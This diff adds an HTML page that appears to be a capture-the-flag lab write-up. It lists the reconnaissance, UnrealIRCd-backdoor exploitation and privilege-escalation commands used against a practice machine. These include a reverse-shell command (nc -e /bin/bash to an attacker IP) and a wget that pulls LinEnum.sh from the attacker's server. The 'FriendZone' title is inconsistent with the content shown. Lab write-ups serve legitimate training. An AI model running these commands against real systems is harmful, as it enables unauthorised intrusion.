@@ -1,0 +1,25 @@
+<html>
+    <head></head>
+    <div>
+        <h1>FriendZone WriteUP</h1>
+        <p>Steps are Reconnaissance, Enumeration, Privilege Escalation</p>
+        <br>
+        <ol><li>Reconnaissance: nmap -sC -sV -O -oA initial 10.10.10.117, <br>
+            nmap -sC -sV -O -p- -oA full 10.10.10.117, nmap -sU -O -p- -oA udp 10.10.10.117,</li>
+            
+            <li>Enumeration: gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.117,<br>
+                nmap -p 6697,8067,65534 --script irc-unrealircd-backdoor 10.10.10.117,</li>
+            
+            <li>Gaining Initial Foothold: nc -nlvp 4444,<br>
+                nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.6 4444" 10.10.10.117, <br>
+                python -c 'import pty; pty.spawn("/bin/bash")', stty raw -echo, </li>
+            
+            <li>Privilege Escalation: python -m SimpleHTTPServer 5555, cd /tmp<br>
+                wget http://10.10.14.6:5555/LinEnum.sh, chmod +x LinEnum.sh, ./LinEnum.sh,<br>
+                cd /usr/bin, viewuser, echo “bash” > /tmp/listysers </li>
+
+            <li>Extra content: apt-get install steghide, steghide extract -sf irked.jpg,<br>
+                ssh djmardov@10.10.10.117</li>
+        </ol>       
+    </div>
+</html>
